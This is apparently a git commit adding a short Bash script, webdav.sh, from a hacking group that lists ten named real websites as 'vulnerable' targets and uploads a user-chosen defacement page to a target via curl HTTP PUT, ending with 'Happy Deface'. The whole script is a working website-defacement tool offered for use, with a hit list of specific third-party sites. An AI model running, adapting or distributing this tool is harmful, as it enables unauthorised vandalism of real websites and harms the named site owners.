4176b5118ce4f2b578bed9ee3bb4ad7e3961ae09
M7909 <72856961+M7909@users.noreply.github.com>
2020-10-15 09:26:28 +0800

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,37 @@
+clear
+echo "\033[1;36m<---------------------------------------> "
+echo "\033[1;36m======Welcome To My Tools==============="
+echo "\033[1;36m author:Seyos Gaming"
+echo "\033[1;36m author: DarkDorky Mods"
+echo "\033[1;36m author: Mr.Aduy"
+echo "\033[1;36m author:Mr.Santuy>>"
+echo "\033[1;36m Team:Squad DarkCyber Team"
+echo "\033[1;36m<-------------------------------------->"
+echo
+
+figlet Web Vuln | lolcat
+echo "Ni Daftar Web Vuln" | lolcat
+
+echo "\033[1;36m<---------------------------------->"
+echo "\033[1;36m{1}:http://thefoundation.co.za"
+echo "\033[1;36m{2}:http://techdirect.co.za"
+echo "\033[1;36m{3}:http://techdirect.co.za"
+echo "\033[1;36m{4}:http://tieronecapital.co.za"
+echo "\033[1;36m{5}:http://totemafrica.com"
+echo "\033[1;36m{6}:http://ziady.com"
+echo "\033[1;36m{7}:http://whadiz.com"
+echo "\033[1;36m{8}: http://umkhondo.com"
+echo "\033[1;36m{9}:http://tapifare.com"
+echo "\033[1;36m{10}:http://whosting.co.za"
+echo "\033[1;36m<---------------------------------->"
+
+read -p "Masukan Nama Script Deface Kalian >> " sc
+read -p "Web Target >> " web
+curl -T /sdcard/$sc $web
+
+echo
+
+echo "Done>> "$web/$sc
+
+
+figlet Happy Deface | lolcat
